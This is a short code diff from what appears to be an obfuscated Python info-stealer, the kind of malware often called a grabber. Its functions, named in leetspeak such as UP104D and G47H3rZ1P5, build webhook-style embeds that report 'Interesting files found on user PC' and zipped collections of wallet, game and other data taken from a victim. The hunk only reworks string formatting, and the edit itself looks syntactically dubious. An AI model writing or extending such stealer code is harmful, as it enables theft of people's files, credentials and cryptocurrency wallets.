@@ -518,7 +518,7 @@ def UP104D(name, link):
                 "color": 2895667,
                 "fields": [
                     {
-                    "name": "Interesting files found on user PC:" token2,
+                    "name": "Interesting files found on user PC:" f"token2",
                     "value": link
                     }
                 ],
@@ -706,7 +706,7 @@ def G47H3rZ1P5(paths1, paths2, paths3):
         "content": g108411NF0(),
         "embeds": [
             {
-            "title": f"{cname} Zips" token2,
+            "title": f"{cname} Zips" f"token2",
             "description": f"{wal}\n{ga}\n{ot}",
             "color": 2895667,
             "footer": {
